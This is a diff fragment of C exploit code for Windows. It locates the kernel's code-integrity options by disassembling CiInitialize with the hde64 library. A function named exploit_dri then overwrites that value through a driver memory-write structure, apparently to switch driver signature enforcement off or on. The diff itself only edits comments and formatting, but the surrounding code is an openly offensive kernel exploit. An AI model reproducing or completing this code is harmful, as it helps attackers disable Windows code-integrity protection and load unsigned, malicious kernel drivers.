@@ -1,5 +1,5 @@
 #include<windows.h>
-#include "hde64.h"
+#include "hde64.h"  //using hacker disassembler
 #include<stdio.h>
 #include <string.h>
 
@@ -107,7 +107,7 @@ LONG QueryCiOptions(
 			j = 0;
 			do {
 
-				/* call CipInitialize-- win10 image */
+				/* call CipInitialize-- win10*/
 				if (CiInitialize[c] == 0xE8)
 					j++;
 
@@ -129,7 +129,7 @@ LONG QueryCiOptions(
 			c = 0;
 			do {
 
-				/* jmp CipInitialize-- Win7 image */
+				/* jmp CipInitialize-- Win7 */
 				if (CiInitialize[c] == 0xE9) {
 					rel = *(PLONG)(CiInitialize + c + 1);
 					break;
@@ -147,7 +147,8 @@ LONG QueryCiOptions(
 		c = 0;
 		do {
 
-			if (*(PUSHORT)(CiInitialize + c) == 0x0d89) {
+			if (*(PUSHORT)(CiInitialize + c) == 0x0d89) 
+			{
 				rel = *(PLONG)(CiInitialize + c + 2);
 				break;
 			}
@@ -218,9 +219,9 @@ BOOL exploit_dri(ULONG64 dst, BOOL enable)
 	mystruct.dest = dst;
 	ULONG64* cioptions = (ULONG64*)malloc(sizeof(ULONG64));
 	if (enable)
-		*cioptions = 0x6;
+		*cioptions = 0x6; //4|2
 	else
-		*cioptions = 0xe;
+		*cioptions = 0xe; //4|2|8
 	mystruct.src = cioptions;
 	mystruct.size = 1;
 
